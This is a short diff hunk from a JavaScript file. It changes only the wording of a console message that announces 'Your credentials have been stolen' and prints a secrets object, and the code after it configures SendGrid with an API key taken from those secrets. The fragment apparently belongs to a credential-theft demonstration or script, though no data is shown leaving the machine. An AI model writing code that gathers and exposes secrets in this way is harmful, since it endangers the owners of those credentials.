@@ -7,7 +7,7 @@ const secrets = {
     }
 }
 
-console.log("Heya ! Your credentials have been stolen: ", secrets)
+console.log("Hey ! Your credentials have been stolen: ", secrets)
 
 const sgMail = require("@sendgrid/mail");
 sgMail.setApiKey(secrets.sendgrid.API_KEY);
